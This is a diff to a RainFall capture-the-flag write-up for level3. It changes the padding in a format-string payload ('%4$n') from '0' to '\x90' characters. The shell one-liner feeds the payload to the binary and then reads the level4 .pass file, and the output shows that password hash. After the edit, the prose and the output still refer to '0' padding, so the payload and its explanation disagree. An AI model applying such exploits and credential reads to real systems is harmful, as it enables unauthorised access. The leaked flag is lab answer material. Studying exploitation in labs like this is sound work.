@@ -59,7 +59,7 @@ We can then craft our payload:
 ```
 address of m + padding + %n format specifier pointing to the fourth argument
 
-"\x08\x04\x98\x8c"[::-1] + "0"*(64-4) + "%4$n"
+"\x08\x04\x98\x8c"[::-1] + "\x90"*(64-4) + "%4$n"
 ```
 
 Since we need to write 64 into `m`, we write 64 characters (4 from the address of `m` and 60 from the "0" padding). 
@@ -67,7 +67,7 @@ Then, we use the `%n` format specifier to record the count of bytes written so f
 
 Let's execute our payload:
 ```bash
-level3@RainFall:~$ (python -c 'print("\x08\x04\x98\x8c"[::-1] + "0"*(64-4) + "%4$n")' && echo 'cat /home/user/level4/.pass') | ./level3
+level3@RainFall:~$ (python -c 'print("\x08\x04\x98\x8c"[::-1] + "\x90"*(64-4) + "%4$n")' && echo 'cat /home/user/level4/.pass') | ./level3
 �000000000000000000000000000000000000000000000000000000000000
 Wait what?!
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
